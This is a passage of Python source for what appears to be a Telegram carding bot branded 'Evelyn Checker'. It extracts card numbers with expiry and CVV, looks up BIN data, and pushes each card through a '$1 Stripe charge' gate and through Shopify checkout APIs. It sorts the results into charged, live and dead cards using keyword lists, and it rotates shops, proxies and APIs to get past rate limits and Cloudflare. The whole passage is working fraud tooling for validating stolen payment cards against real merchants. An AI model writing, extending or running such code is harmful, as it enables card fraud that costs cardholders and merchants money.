        return []
    raw = str(text)
    seen: set[str] = set()
    cards: list[str] = []

    for m in _CC_EXTRACT_RE.finditer(raw):
        normalized = _normalize_cc_parts(m.group(1), m.group(2), m.group(3), m.group(4))
        if normalized and normalized not in seen:
            seen.add(normalized)
            cards.append(normalized)

    for line in raw.splitlines():
        line = line.strip()
        if not line or _CC_EXTRACT_RE.search(line):
            continue
        normalized = _parse_cc_from_raw(line)
        if normalized and normalized not in seen:
            seen.add(normalized)
            cards.append(normalized)

    if not cards:
        normalized = _parse_cc_from_raw(raw)
        if normalized:
            cards.append(normalized)

    return cards


def extract_bin_from_text(text: str) -> str | None:
    """Pull 6-digit BIN from CC line, standalone BIN, or digit blob."""
    if not text:
        return None
    raw = str(text).strip()
    cards = extract_cc(raw)
    if cards:
        return cards[0].split('|')[0][:6]
    m = re.search(r'\b(\d{6,8})\b', raw)
    if m:
        return m.group(1)[:6]
    digits = re.sub(r'\D', '', raw)
    if len(digits) >= 6:
        return digits[:6]
    return None


def _reject_oversized_upload(file_obj) -> bool:
    try:
        return int(getattr(file_obj, 'size', None) or 0) > MAX_UPLOAD_BYTES
    except Exception:
        return False


async def fetch_bin_data(bin_number: str) -> dict | None:
    """Juspay BIN lookup."""
    bin_number = re.sub(r'\D', '', str(bin_number or ''))[:6]
    if len(bin_number) < 6:
        return None
    try:
        timeout = aiohttp.ClientTimeout(total=12)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f'{BIN_API_URL}/{bin_number}') as res:
                if res.status != 200:
                    return None
                data = await res.json(content_type=None)
        return data if isinstance(data, dict) else None
    except Exception:
        return None


_NUMERIC_COUNTRY_ISO2 = {
    '004': 'AF', '008': 'AL', '012': 'DZ', '032': 'AR', '036': 'AU', '040': 'AT',
    '050': 'BD', '076': 'BR', '124': 'CA', '156': 'CN', '170': 'CO', '191': 'HR',
    '203': 'CZ', '208': 'DK', '214': 'DO', '218': 'EC', '233': 'EE', '246': 'FI',
    '250': 'FR', '276': 'DE', '288': 'GH', '300': 'GR', '344': 'HK', '348': 'HU',
    '356': 'IN', '360': 'ID', '372': 'IE', '376': 'IL', '380': 'IT', '392': 'JP',
    '400': 'JO', '410': 'KR', '414': 'KW', '422': 'LB', '458': 'MY', '484': 'MX',
    '528': 'NL', '554': 'NZ', '566': 'NG', '578': 'NO', '586': 'PK', '604': 'PE',
    '608': 'PH', '616': 'PL', '620': 'PT', '634': 'QA', '642': 'RO', '643': 'RU',
    '682': 'SA', '702': 'SG', '703': 'SK', '704': 'VN', '710': 'ZA', '724': 'ES',
    '752': 'SE', '756': 'CH', '764': 'TH', '784': 'AE', '792': 'TR', '804': 'UA',
    '826': 'GB', '840': 'US', '858': 'UY', '862': 'VE',
}


def _country_flag_emoji(country_code, country_name: str = '') -> str:
    iso2 = ''
    code = str(country_code or '').strip().zfill(3)
    if code in _NUMERIC_COUNTRY_ISO2:
        iso2 = _NUMERIC_COUNTRY_ISO2[code]
    elif len(code) == 2 and code.isalpha():
        iso2 = code.upper()
    if not iso2 and country_name:
        name_map = {
            'UNITED KINGDOM': 'GB', 'UNITED STATES': 'US', 'UNITEDSTATES': 'US', 'USA': 'US',
            'INDIA': 'IN', 'CANADA': 'CA', 'AUSTRALIA': 'AU', 'GERMANY': 'DE',
            'FRANCE': 'FR', 'BRAZIL': 'BR', 'MEXICO': 'MX', 'TAJIKISTAN': 'TJ',
        }
        upper = str(country_name).upper().strip()
        iso2 = name_map.get(upper, '') or name_map.get(upper.replace(' ', ''), '')
    if len(iso2) != 2:
        return ''
    return ''.join(chr(127397 + ord(c)) for c in iso2.upper())


def tg_html_blockquote(*lines: str, expandable: bool = False) -> str:
    """Telegram official HTML quote — https://core.telegram.org/bots/api#html-style"""
    body = '\n'.join(lines)
    if expandable:
        return f'<blockquote expandable>{body}</blockquote>'
    return f'<blockquote>{body}</blockquote>'


def format_bin_lookup_ui(bin_number: str, data: dict) -> str:
    """BIN card UI — native Telegram <blockquote>, no premium_emoji (keeps quote intact)."""
    brand = escape(str(data.get('brand') or '-').upper())
    card_type = escape(str(data.get('type') or data.get('extended_card_type') or '').upper())
    level = escape(str(data.get('card_sub_type') or '').upper())
    type_line = escape(f"{card_type} {level}".strip() or '-')
    bank = escape(str(data.get('bank') or '-').upper())
    country = escape(str(data.get('country') or '-').upper())
    flag = _country_flag_emoji(data.get('country_code'), country)
    country_line = f"{country} {flag}".strip()
    bin_safe = escape(bin_number)
    quote_body = tg_html_blockquote(
        f'👛 BIN: <code>{bin_safe}</code>',
        f'📲 Bank: {bank}',
        f'💎 Brand: {brand}',
        f'🔎 Type: {type_line}',
        f'🌐 Country: {country_line}',
    )
    return (
        f'⚡️ 💎 BIN Lookup 💎 ⚡️\n'
        f'━━━━━━━━━━━━━━━━━\n'
        f'{quote_body}\n'
        f'━━━━━━━━━━━━━━━━━\n\n'
        f'🤖 By: {dev_credit_html()}'
    )



# ── Soul/botg3 classifier keyword lists (+ Evelyn extras kept) ──────────────
CHARGE_KEYWORDS = (
    'Thank you', 'Thank You', 'ThankYou', 'Your order is confirmed',
    '/thankyou', '/post_purchase', 'checkouturl',
    'Order confirmed', 'Payment successful',
    'ORDERL_PLACED', 'ORDER_PLACED',
)
_EVELYN_CHARGE_EXTRAS = (
    'order completed', 'order_placed', 'thank you', 'payment successful',
)

LIVE_3DS_KEYWORDS = (
    '3D_AUTHENTICATION', '3DS_REQUIRED', 'DS_REQUIRED', '3d_secure_required',
    'requires_action', 'authentication_required',
    'INCORRECT_CVC', 'INCORRECT_CVV', 'INCORRECT_ZIP', 'INVALID_ZIP',
    'INSUFFICIENT_FUNDS', 'OTP_REQUIRED',
    'security check', 'verify', '3ds', '3d secure',
    'setup_intent_succeeded',
)
# Evelyn live extras (lowercase / unicode variants not in LIVE_3DS_KEYWORDS)
_EVELYN_LIVE_EXTRAS = (
    'insufficient funds', 'insufficient fund', 'insufficient balance',
    'not sufficient funds', 'insufficientfunds', 'not enough funds',
    'balance insufficient', 'card has insufficient', 'exceeds available', 'low balance',
    'ɪɴꜱᴜꜰꜰɪᴄɪᴇɴᴛ_ꜰᴜɴᴅꜱ', 'ɪɴꜱᴜꜰꜰɪᴄɪᴇɴᴛ',
    'incorrect cvv', 'invalid_cvv', 'invalid cvv', 'incorrect cvc', 'invalid_cvc',
    'incorrect zip', 'invalid_zip', 'invalid_security_code', 'security code incorrect',
    'cvv incorrect', 'cvc incorrect', 'zip incorrect',
    'requires action', '3ds required', 'ds required', '3d secure required',
    '3d authentication', 'authentication required', 'otp required',
)

# OTP/3DS only — live stats yes, no instant GIF/mirror (insuff/CVV/zip alert normally)
_OTP_3DS_KEYWORDS = (
    'ᴏᴛᴘ_ʀᴇǫᴜɪʀᴇᴅ',
    '3D_AUTHENTICATION', '3DS_REQUIRED', 'DS_REQUIRED', '3d_secure_required',
    'requires_action', 'requires action', 'authentication_required', 'authentication required',
    'OTP_REQUIRED', 'otp required', 'otp_required',
    'security check', 'verify', '3ds', '3ds required', '3d secure', '3d secure required',
    'setup_intent_succeeded', 'challenge required', 'verification required',
    'ds required', 'complete_payment_challenge', 'payment_challenge',
    'three_d_secure', 'action_required', 'authenticate', '3d authentication',
)

DECLINE_KEYWORDS = (
    'CARD_DECLINED', 'card_declined', 'generic_decline', 'declined',
    'expired_card', 'card_not_supported', 'issuer_declined',
    'pickup_card', 'restricted_card', 'lost_card',
    'FRAUD_SUSPECTED', 'do_not_honor', 'invalid_account',
)

ERROR_KEYWORDS = (
    "Can't find checkout token", "Can'ot find queue token",
    'Token Empty', 'r3 token empty', 'r4 token empty',
    'INVALID_TOKEN', 'INVALID_SESSION_TOKEN',
    'Product id is empty', 'py id empty', 'r2 id empty',
    'Item is out of stock', 'Item out of stock',
    'Invalid URL', 'Error in 1 req',
    'no payment method', 'no payment Method Identifier',
    'no cc token (ID)', 'Clinte Token', 'Client Token',
    'no delivery lines', 'NO AVAILABLE DELIVERY METHOD',
    'del ammount empty', 'delivery ammount empty',
    'tax ammount empty', 'no tAX',
    'can not find currecncy code', 'cn url empty',
    'NO RECEIPT ID', 'ERROR WHILE SUMBIT',
    'cURL error', 'network error', 'connection failed',
    'server error', 'bad request', 'unauthorized',
    'forbidden', 'not found', 'method not allowed',
    'internal server error', 'service unavailable',
    'gateway timeout', 'processing_error',
    'GENERIC_ERROR',
    'issuer_not_available', 'try_again_later',
    'HCAPTCHA DETECTED', 'CAPTCHA_REQUIRED',
    'service_not_allowed', 'merchant_blacklist',
    'currency_not_supported', 'card_not_supported',
)

SITE_ISSUE_DECLINE_KEYWORDS = (
    'GENERIC_ERROR', 'PROCESSING_ERROR', 'TRY_AGAIN_LATER',
    'ISSUER_NOT_AVAILABLE', 'GATEWAY_TIMEOUT', 'SERVER_ERROR',
    'INTERNAL_SERVER_ERROR', 'SERVICE_UNAVAILABLE', 'BAD_GATEWAY',
    'RATE_LIMIT', 'TOO_MANY_REQUESTS', 'BLOCKED', 'FORBIDDEN',
    'UNAUTHORIZED', 'TIMEOUT', 'CONNECTION', 'NETWORK', 'CURL',
    'CANNOT_CONNECT', 'REFUSED', 'RESET', 'DNS', 'SSL', 'TLS',
    'CERTIFICATE', 'HANDSHAKE', 'PROXY', 'TUNNEL', 'SOCKS',
    '404', '500', '502', '503', '504', '520', '521', '522', '523',
    '524', '525', '526', '527', '530', '598', '599',
)

_SOUL_DEAD_SITE_INDICATORS = (
    "Can't find checkout token", 'Token Empty', 'INVALID_TOKEN',
    'Product id is empty', 'Item is out of stock', 'Invalid URL',
    'Error in 1 req', 'no payment method', 'no cc token', 'Client Token',
    'no delivery lines', 'NO AVAILABLE DELIVERY METHOD',
    'tax ammount empty', 'can not find currecncy code',
    'NO RECEIPT ID', 'ERROR WHILE SUMBIT',
    'cURL error', 'network error', 'connection failed',
    'server error', 'bad request', 'unauthorized', 'forbidden',
    'internal server error', 'service unavailable', 'gateway timeout',
    'processing_error', 'issuer_not_available', 'try_again_later',
    'HCAPTCHA DETECTED', 'CAPTCHA_REQUIRED',
    'service_not_allowed', 'merchant_blacklist', 'currency_not_supported',
    'Cannot connect', 'Connection refused', 'Connection reset',
    'DNS error', 'SSL error', 'TLS error', 'Certificate error',
    'Handshake failed', 'Proxy error', 'Tunnel error',
    'Socks error', 'HTTP error', '404', '500', '502', '503', '504',
    'site error! status:', 'submit rejected', 'unknown result', 'no result',
    'no_session_token', 'failed to get session token',
    'unable to get payment token',
    'invalid json', '<!DOCTYPE', '<html', 'failed to perform',
    'failed to connect',
    'cloudflare', 'timed out', 'access denied',
    'url rejected', 'amount_too_small', 'amount too small',
    'SITE DEAD', 'site dead', 'site not supported', 'not supported',
    'captcha_required', 'captcha required',
    'all sites dead', 'max retries exceeded', 'all sites unavailable',
    'generic error', 'generic_error', 'GENERIC_ERROR',
    'Error Processing Card', 'error:',
    '407', 'Proxy Authentication', 'Proxy-Authenticate',
    'proxy authentication required', 'proxy auth',
)


def _dedupe_keywords(items) -> tuple:
    seen = set()
    out = []
    for item in items:
        key = str(item).lower()
        if key not in seen:
            seen.add(key)
            out.append(str(item))
    return tuple(out)


_ALL_SITE_ERROR_KEYWORDS = _dedupe_keywords(
    list(_DEAD_INDICATORS) + list(ERROR_KEYWORDS) + list(SITE_ISSUE_DECLINE_KEYWORDS)
    + list(_SOUL_DEAD_SITE_INDICATORS)
)


def _kw_in(text, keywords) -> bool:
    blob = str(text).lower()
    return any(str(kw).lower() in blob for kw in keywords)


def _is_otp_hit_text(text, status='') -> bool:
    return _kw_in(f'{text} {status}', _OTP_3DS_KEYWORDS)


def _is_live_hit_text(text, status='') -> bool:
    blob = f'{text} {status}'
    if _kw_in(blob, LIVE_3DS_KEYWORDS) or _kw_in(blob, _EVELYN_LIVE_EXTRAS):
        return True
    st = str(status or '').strip().lower()
    if st in ('approved', 'live', 'insufficient_funds', 'insufficient funds'):
        return True
    if 'insufficient' in st and 'fund' in st:
        return True
    return False


def _is_charge_response(response_msg, status='') -> bool:
    """Real charge only — live/OTP responses never count as charged."""
    if _is_live_hit_text(response_msg, status):
        return False
    st = str(status or '').strip().lower()
    if st in ('approved', 'live', 'insufficient_funds', 'insufficient funds'):
        return False
    if 'insufficient' in st and 'fund' in st:
        return False
    if st == 'charged':
        return True
    if '💎' in str(response_msg or ''):
        return True
    blob = f'{response_msg} {status}'
    return _kw_in(blob, CHARGE_KEYWORDS) or _kw_in(blob, _EVELYN_CHARGE_EXTRAS)


def _is_decline_response(response_msg, status='') -> bool:
    return _kw_in(f'{response_msg} {status}', DECLINE_KEYWORDS)


def _is_site_error_response(response_msg, status='') -> bool:
    blob = f'{response_msg} {status}'
    return (
        _kw_in(blob, ERROR_KEYWORDS)
        or _kw_in(blob, SITE_ISSUE_DECLINE_KEYWORDS)
        or _kw_in(blob, _SOUL_DEAD_SITE_INDICATORS)
    )


def is_live_hit_result(result) -> bool:
    if not result:
        return False
    if result.get('status') == 'Approved':
        return True
    msg = result.get('message', '')
    st = result.get('status', '')
    if _is_otp_hit_text(msg, st):
        return True
    return _is_live_hit_text(msg, st)


def _as_approved_result(result: dict) -> dict:
    if result.get('status') == 'Approved':
        return result
    out = dict(result)
    out['status'] = 'Approved'
    msg = str(out.get('message') or '')
    msg_lower = msg.lower()
    if 'insufficient' in msg_lower and 'ɪɴꜱᴜꜰꜰɪᴄɪᴇɴᴛ' not in msg_lower:
        out['message'] = 'ɪɴꜱᴜꜰꜰɪᴄɪᴇɴᴛ_ꜰᴜɴᴅꜱ'
    return out


def is_dead_site_error(error_msg):
    """Check if error indicates dead site — never treat live/insuff/otp hits as site errors."""
    if not error_msg:
        return True
    if _is_live_hit_text(error_msg) or _is_otp_hit_text(error_msg):
        return False
    error_lower = str(error_msg).lower()
    return any(keyword.lower() in error_lower for keyword in _ALL_SITE_ERROR_KEYWORDS)


def is_valid_alive_site_result(res: dict) -> bool:
    """Final gate before writing to global_sites.json — blocks Unknown/invalid-json garbage."""
    if not res or res.get('status') != 'alive':
        return False
    response_msg = str(res.get('response') or '')
    if is_dead_site_error(response_msg) or _is_site_error_response(response_msg):
        return False
    gate = str(res.get('gateway') or '').strip().lower()
    if not gate or gate in ('unknown', '-', 'n/a', 'none') or 'shopify' not in gate:
        return False
    pv = parse_price_value(res.get('price'))
    if pv is None or pv < GLOBAL_MIN_PRICE or pv > GLOBAL_MAX_PRICE:
        return False
    return True

async def get_bin_info(card_number):
    """Get BIN info from Juspay API (used in /sh, /st hit cards)."""
    try:
        data = await get_bin_info_mapped(card_number)
        if not data:
            return 'BIN Info Not Found', '-', '-', '-', '-', ''
        brand = data.get('vendor') or '-'
        bin_type = data.get('type') or data.get('extended_card_type') or '-'
        level = data.get('level') or data.get('card_sub_type_category') or '-'
        bank = data.get('bank_name') or '-'
        country = data.get('country') or '-'
        flag = data.get('flag') or ''
        return brand, bin_type, level, bank, country, flag
    except Exception:
        return '-', '-', '-', '-', '-', ''


async def check_stripe(card: str) -> dict:
    """Stripe $1 gate — no proxy/site required."""
    try:
        url = f"{STRIPE_API_URL}?cc={quote(card, safe='')}"
        timeout = aiohttp.ClientTimeout(total=90)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as resp:
                raw = await resp.json(content_type=None)
        if not isinstance(raw, dict):
            return {
                'status': 'Dead',
                'card': card,
                'message': str(raw)[:150],
                'gateway': 'Stripe $1 Charge',
                'price': '-',
                'time': '-',
            }
        response_msg = str(raw.get('response') or raw.get('message') or 'Unknown')
        gate = str(raw.get('gateway') or 'Stripe $1 Charge')
        status_raw = str(raw.get('status') or '')
        elapsed = str(raw.get('time') or '-')
        status_lower = status_raw.lower()
        response_lower = response_msg.lower()
        insuff_signals = (
            'insufficient_funds',
            'insufficient funds',
            'insufficient balance',
            'not sufficient funds',
            'insufficient fund',
            'low balance',
        )
        cvc_signals = (
            'incorrect_cvc',
            'incorrect cvc',
            'invalid_cvc',
            'invalid cvc',
            'incorrect_cvv',
            'incorrect cvv',
            'invalid_cvv',
            'invalid cvv',
        )
        if (
            status_lower.strip() == 'charged'
            or 'payment successfully' in response_lower
            or '💎' in status_raw
        ):
            hit_status = 'Charged'
        elif (
            any(sig in response_lower or sig in status_lower for sig in insuff_signals)
            or any(sig in response_lower or sig in status_lower for sig in cvc_signals)
        ):
            hit_status = 'Approved'
        else:
            hit_status = 'Dead'
        return {
            'status': hit_status,
            'card': str(raw.get('card') or card),
            'message': response_msg,
            'gateway': gate,
            'price': '$1.00',
            'time': elapsed,
        }
    except asyncio.TimeoutError:
        return {
            'status': 'Dead',
            'card': card,
            'message': 'Request timed out',
            'gateway': 'Stripe $1 Charge',
            'price': '-',
            'time': '-',
        }
    except Exception as e:
        return {
            'status': 'Dead',
            'card': card,
            'message': str(e)[:150],
            'gateway': 'Stripe $1 Charge',
            'price': '-',
            'time': '-',
        }


def format_stripe_result_ui(result: dict, brand, bin_type, level, bank, country, flag) -> str:
    card = escape(str(result.get("card", "N/A")))
    status_lower = str(result.get("status", "") or "").strip().lower()
    msg_lower = str(result.get("message", "") or "").strip().lower()
    
    if status_lower == "charged":
        status_title = "🤍 𝑪𝑯𝑨𝑹𝑮𝑬𝑫 🤍"
    elif "insufficient" in status_lower or "insufficient" in msg_lower or "insuff" in status_lower or "insuff" in msg_lower:
        status_title = "😀 𝑰𝑵𝑺𝑼𝑭𝑭𝑰𝑪𝑰𝑬𝑵𝑻 😀"
    elif "3d" in status_lower or "3d" in msg_lower or "otp" in status_lower or "otp" in msg_lower or "challenge" in status_lower or "challenge" in msg_lower:
        status_title = "😀 𝟑𝑫𝑺 😀"
    elif status_lower == "approved" or status_lower == "live":
        status_title = "😀 𝑳𝑰𝑽𝑬 😀"
    else:
        status_title = "⚠️ 𝑫𝑬𝑨𝑫 𝑪𝑨𝑹𝑫 ⚠️"
        
    status = escape(str(result.get("message", "") or "Dead").replace("💀", "").replace("☠️", "").replace("☠", "").strip())
    
    # Format gateway
    gateway = escape(str(result.get("gateway") or "Stripe $1 Charge"))
    
    # Format price
    raw_price = str(result.get("price") or "-").strip()
    if raw_price.startswith("$"):
        price = escape(raw_price)
    elif raw_price in ("-", "", "N/A", "0.00", "0.0", "0"):
        price = "N/A"
    else:
        price = f"${escape(raw_price)}"
        
    # Format BIN Info
    parts = []
    for p in (brand, bin_type, level):
        p_str = str(p or '').strip()
        if p_str and p_str.upper() not in ("UNKNOWN", "-", "") and p_str not in parts:
            parts.append(p_str.upper())
    bin_line = escape(" - ".join(parts) if parts else "UNKNOWN")
    
    bank_name = str(bank or '').strip()
    if bank_name.lower() in ("unknown", "-", "", "none"):
        bank_name = "None"
    bank_escaped = escape(bank_name)
    
    country_name = str(country or '').strip()
    if country_name.lower() in ("unknown", "-", "", "none"):
        country_name = "Unknown"
    country_escaped = escape(country_name.upper())
    
    return (
        f"⚡️ 𝐄𝐕𝐄𝐋𝐘𝐍 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 ⚡️\n\n"
        f"{status_title}\n\n"
        f"💳 CC : <code>{card}</code>\n"
        f"🛒 Gateway : {gateway}\n"
        f"📝 Response: {status}\n"
        f"💵 Price   : {price}\n\n"
        f"💳 BIN Info: {bin_line}\n"
        f"🌐 Bank: {bank_escaped}\n"
        f"🌐 Country: {country_escaped} {flag}\n\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📬 Made by <a href=\"{DEV_LINK}\">{DEV_NAME}</a>"
    )


def _is_infra_api_error(raw) -> bool:
    """API transport/parse failures — safe to retry (timeout, invalid json, empty body)."""
    if not isinstance(raw, dict):
        return True
    msg = str(
        raw.get('Response') or raw.get('response') or
        raw.get('Message') or raw.get('message') or ''
    ).lower()
    return any(k in msg for k in (
        'request timeout', 'timeout', 'timed out',
        'invalid json', 'empty api', 'bad api',
        'empty api response', 'connection', 'network error',
    ))


async def check_card(card, site, proxy, *, bypass_user_pool=False, api_id=None):
    """Check a single card — uses api_id or round-robin across enabled checker APIs."""
    try:
        parts = card.split('|')
        if len(parts) != 4:
            return {'status': 'Invalid Format', 'message': 'Invalid card format', 'card': card}

        mgr = get_checker_manager()
        if not api_id:
            api_id = mgr.pick_api_id()
        if not api_id:
            return {
                'status': 'Dead', 'message': 'No checker API enabled',
                'card': card, 'gateway': 'Unknown', 'price': '-',
            }

        async def _fetch(aid=api_id):
            api_url = mgr.get_api_url(aid)
            return await _checker_request(api_url, site, card, proxy)

        if bypass_user_pool:
            raw = await _fetch(api_id)
        else:
            raw = await mgr.execute(api_id, lambda: _fetch(api_id))

        # Immediate infra retry: timeout / invalid json — switch API once before outer retry loop
        if _is_infra_api_error(raw):
            retry_api = mgr.pick_api_id(exclude=api_id)
            if retry_api and retry_api != api_id:
                try:
                    if bypass_user_pool:
                        raw2 = await _fetch(retry_api)
                    else:
                        raw2 = await mgr.execute(retry_api, lambda: _fetch(retry_api))
                    if isinstance(raw2, dict) and not _is_infra_api_error(raw2):
                        raw = raw2
                except Exception:
                    pass

        if not isinstance(raw, dict):
            return {
                'status': 'Site Error',
                'message': f'Bad API response ({type(raw).__name__})',
                'card': card, 'retry': True,
            }

        # Response text drives bucket — Status bool true/false is NOT charge/live (API check flag only)
        response_msg = str(
            raw.get('Response') or raw.get('response') or
            raw.get('Message') or raw.get('message') or ''
        ).strip()
        price = raw.get('Price', '-')
        gate = raw.get('Gateway', raw.get('Gate', 'Shopify Payments'))
        raw_st = raw.get('Status', '')
        status = '' if isinstance(raw_st, bool) else str(raw_st or '')

        response_lower = response_msg.lower()

        # Live + OTP/3DS BEFORE charge — OTP is main live; insuff contains "failed"
        if (
            _is_live_hit_text(response_msg, status)
            or _is_otp_hit_text(response_msg, status)
            or status.lower() in ('approved', 'live')
        ):
            if _is_otp_hit_text(response_msg, status):
                display_msg = 'ᴏᴛᴘ_ʀᴇǫᴜɪʀᴇᴅ'
            elif _is_live_hit_text(response_msg, status) and 'insufficient' in response_lower:
                display_msg = 'ɪɴꜱᴜꜰꜰɪᴄɪᴇɴᴛ_ꜰᴜɴᴅꜱ'
            else:
                display_msg = response_msg
            return {'status': 'Approved', 'message': display_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}

        if _is_charge_response(response_msg, status):
            display_msg = 'ORDER_PLACED' if 'order_placed' in response_lower else response_msg
            return {'status': 'Charged', 'message': display_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}

        if _is_decline_response(response_msg, status):
            dead_msg = 'ᴄᴀʀᴅ_ᴅᴇᴄʟɪɴᴇᴅ' if 'card_declined' in response_lower or 'card declined' in response_lower else response_msg
            return {'status': 'Dead', 'message': dead_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}

        if _is_site_error_response(response_msg, status) or is_dead_site_error(response_msg):
            return {'status': 'Site Error', 'message': response_msg, 'card': card, 'retry': True, 'gateway': gate, 'price': price}
        if 'cloudflare bypass failed' in response_lower:
            return {'status': 'Site Error', 'message': 'Cloudflare spotted', 'card': card, 'retry': True, 'gateway': gate, 'price': price}

        dead_msg = 'ᴄᴀʀᴅ_ᴅᴇᴄʟɪɴᴇᴅ' if 'card_declined' in response_lower or 'card declined' in response_lower else response_msg
        return {'status': 'Dead', 'message': dead_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}

    except asyncio.TimeoutError:
        return {'status': 'Site Error', 'message': 'Request timeout', 'card': card, 'retry': True}
    except Exception as e:
        error_msg = str(e)
        if is_dead_site_error(error_msg):
            return {'status': 'Site Error', 'message': error_msg, 'card': card, 'retry': True}
        return {'status': 'Dead', 'message': error_msg, 'card': card, 'gateway': 'Unknown', 'price': '-'}

def _should_session_ban_site(response_msg: str) -> bool:
    """Ban any site that gives errors — invalid json, timeout, cart fail, etc.
    These sites waste slots and slow down the entire session."""
    msg = str(response_msg or '').lower()
    # Ban on ANY dead/error indicator — no exemptions
    return is_dead_site_error(response_msg) or _is_site_error_response(response_msg) or any(k in msg for k in (
        'invalid json', 'expecting value', 'empty api', 'bad api response',
        'empty api response', 'request timeout', 'timed out', 'timeout',
        'cart failed', 'unable to get', 'error processing',
        '503', '502', '504', 'bad gateway', 'service unavailable',
    ))


class _CappedBanSet(set):
    """Set that auto-clears when it reaches max_size — prevents ban death spiral."""
    def __init__(self, max_size):
        super().__init__()
        self._max_size = max_size
    def add(self, item):
        if len(self) >= self._max_size:
            self.clear()
        super().add(item)


def _pick_chk_site(sites, used_sites, bad_sites):
    """Prefer fresh sites; skip session-banned dead shops."""
    blocked = set(used_sites) | set(bad_sites or ())
    available = [s for s in sites if s not in blocked]
    if not available:
        available = [s for s in sites if s not in (bad_sites or set())] or list(sites)
    return random.choice(available)


async def check_card_with_retry(card, sites, proxies, max_retries=3, bad_sites=None, *, bypass_user_pool=False, per_attempt_timeout=30):
    """Check a card with automatic retry, tracking bad sites.
    Features:
    - Basic retry with site/proxy/API rotation
    - Dedicated 429 handling (3 retries + 1.5s delay)
    - Generic error handling (2 retries + 1.0s delay)
    - Smart retry on Unknown gateway / $0.00 price
    - Permanent site removal after repeated failures
    """
    last_result = None
    if not sites:
        return {'status': 'Dead', 'message': 'No sites available', 'card': card, 'gateway': 'Unknown', 'price': '-'}
    if not proxies:
         return {'status': 'Dead', 'message': 'No proxies available', 'card': card, 'gateway': 'Unknown', 'price': '-'}

    used_sites = set()
    used_proxies = set()
    last_api_id = None
    last_site = None
    retry_delay = 0.1 if bypass_user_pool else 0.3
    mgr = get_checker_manager()

    # ========== MAIN RETRY LOOP ==========
    for attempt in range(max_retries):
        generic_error_retries = 0

        site = _pick_chk_site(sites, used_sites, bad_sites)
        used_sites.add(site)
        last_site = site
        available_px = [p for p in proxies if p not in used_proxies] or proxies
        proxy = random.choice(available_px)
        used_proxies.add(proxy)
        # On retry: switch API (exclude last), site, and proxy
        api_id = mgr.pick_api_id(exclude=last_api_id if attempt > 0 else None)
        last_api_id = api_id
        try:
            result = await asyncio.wait_for(
                check_card(card, site, proxy, bypass_user_pool=bypass_user_pool, api_id=api_id),
                timeout=per_attempt_timeout,
            )
        except asyncio.TimeoutError:
            result = {'status': 'Site Error', 'message': 'Request timeout', 'card': card, 'retry': True}
        if not result.get('site'):
            result['site'] = site

        # Track permanent site failures
        if result.get('retry'):
            track_site_permanent_fail(site, result.get('message', ''))

        # ========== HTTP 429 HANDLING ==========
        if _is_rate_limited_msg(result.get('message', '')):
            max_429_retries = 3
            for _ in range(max_429_retries):
                await asyncio.sleep(1.5)  # Give Shopify time to cool down

                # Ban current site for session
                if bad_sites is not None and _should_session_ban_site(result.get('message', '')):
                    bad_sites.add(site)

                # Rotate proxy
                available_px = [p for p in proxies if p not in used_proxies] or list(proxies)
                proxy = random.choice(available_px)
                used_proxies.add(proxy)

                # Rotate site
                site = _pick_chk_site(sites, used_sites, bad_sites)
                used_sites.add(site)

                # Rotate API
                api_id = mgr.pick_api_id(exclude=last_api_id)
                last_api_id = api_id

                try:
                    result = await asyncio.wait_for(
                        check_card(card, site, proxy, bypass_user_pool=bypass_user_pool, api_id=api_id),
                        timeout=per_attempt_timeout,
                    )
                except asyncio.TimeoutError:
                    result = {'status': 'Site Error', 'message': 'Request timeout', 'card': card, 'retry': True}
                if not result.get('site'):
                    result['site'] = site
                if result.get('retry'):
                    track_site_permanent_fail(site, result.get('message', ''))
                if not _is_rate_limited_msg(result.get('message', '')):
                    break  # 429 resolved

            if _is_rate_limited_msg(result.get('message', '')):
                last_result = result
                break  # All 429 retries exhausted
            if not result.get('retry'):
                if result['status'] == 'Charged':
                    return result
                if is_live_hit_result(result):
                    return _as_approved_result(result)

        # ========== GENERIC ERROR HANDLING ==========
        if result.get('retry') and _is_generic_error_msg(result.get('message', '')):
            max_generic_retries = 2
            while generic_error_retries < max_generic_retries:
                generic_error_retries += 1
                await asyncio.sleep(1.0)

                # Rotate site
                site = _pick_chk_site(sites, used_sites, bad_sites)
                used_sites.add(site)

                # Rotate proxy
                available_px = [p for p in proxies if p not in used_proxies] or list(proxies)
                proxy = random.choice(available_px)
                used_proxies.add(proxy)

                # Rotate API
                api_id = mgr.pick_api_id(exclude=last_api_id)
                last_api_id = api_id

                try:
                    result = await asyncio.wait_for(
                        check_card(card, site, proxy, bypass_user_pool=bypass_user_pool, api_id=api_id),
                        timeout=per_attempt_timeout,
                    )
                except asyncio.TimeoutError:
                    result = {'status': 'Site Error', 'message': 'Request timeout', 'card': card, 'retry': True}
                if not result.get('site'):
                    result['site'] = site
                if result.get('retry'):
                    track_site_permanent_fail(site, result.get('message', ''))
                if not result.get('retry'):
                    break  # Success!
                if not _is_generic_error_msg(result.get('message', '')):
                    break  # Different error, let outer loop handle

            if not result.get('retry'):
                if result['status'] == 'Charged':
                    return result
                if is_live_hit_result(result):
                    return _as_approved_result(result)
            else:
                if bad_sites is not None and _should_session_ban_site(result.get('message', '')):
                    bad_sites.add(site)
                last_result = result
                continue  # Try next main attempt

        # ========== SUCCESS CHECK ==========
        if not result.get('retry'):
            if result['status'] == 'Charged':
                return result
            if is_live_hit_result(result):
                return _as_approved_result(result)
            # Smart retry: agar gateway Unknown ya price $0.00 ho aur Dead result ho
            gateway = result.get('gateway', '')
            price = str(result.get('price', '') or '')
            is_unknown_gateway = gateway.lower() in ('unknown', '', 'none')
            is_zero_price = price.strip() in ('$0.00', '0.0', '0', '0.00', '-')
            should_smart_retry = (
                result['status'] == 'Dead' and
                (is_unknown_gateway or is_zero_price) and
                attempt < max_retries - 1
            )
            if not should_smart_retry:
                return result
            # Smart retry — try another site/proxy
            if bad_sites is not None and _should_session_ban_site(result.get('message', '')):
                bad_sites.add(site)
            last_result = result
            await asyncio.sleep(retry_delay * 2)
            continue

        # ========== PROXY ROTATION FOR NEXT ATTEMPT ==========
        if bad_sites is not None and _should_session_ban_site(result.get('message', '')):
            bad_sites.add(site)

        last_result = result
